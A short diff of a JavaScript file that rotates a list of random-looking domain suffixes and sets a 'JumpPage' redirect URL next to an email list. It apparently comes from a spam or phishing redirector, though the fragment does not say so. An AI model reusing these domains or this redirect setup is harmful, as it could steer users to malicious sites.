@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[];
-        urls.push(".vzorrackx.cc");   
-        urls.push(".xglrohzeg.com");  
-        urls.push(".wvaobdmuj.cc");    
+        urls.push(".sijdxrjmr.cc");   
+        urls.push(".vzorrackx.cc");  
+        urls.push(".xglrohzeg.com");    
         
                      	
 var JumpPage="https://dardlimra.com";
